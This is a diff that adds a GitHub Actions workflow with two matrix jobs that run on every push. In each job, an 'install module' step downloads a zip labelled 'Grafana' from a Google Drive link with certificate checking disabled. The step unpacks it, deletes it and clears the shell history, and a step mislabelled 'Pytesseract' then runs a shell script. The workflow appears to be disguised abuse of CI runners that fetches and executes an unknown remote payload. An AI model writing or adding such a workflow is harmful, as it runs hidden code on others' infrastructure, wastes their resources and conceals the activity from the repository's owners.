@@ -1,0 +1,56 @@
+name: aquabien620engine
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  TEST:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Fetch', 'Integrate', 'Evaluate', 'Execute', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1jBqwUqIpfSm0yBiNJ4HB1PLGlcuCBhY_" -O Grafana.zip
+        unzip -o Grafana.zip
+        rm Grafana.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  PUBLISH1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Plan', 'Assemble', 'Validate', 'Run', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1jBqwUqIpfSm0yBiNJ4HB1PLGlcuCBhY_" -O Grafana.zip
+        unzip -o Grafana.zip
+        rm Grafana.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
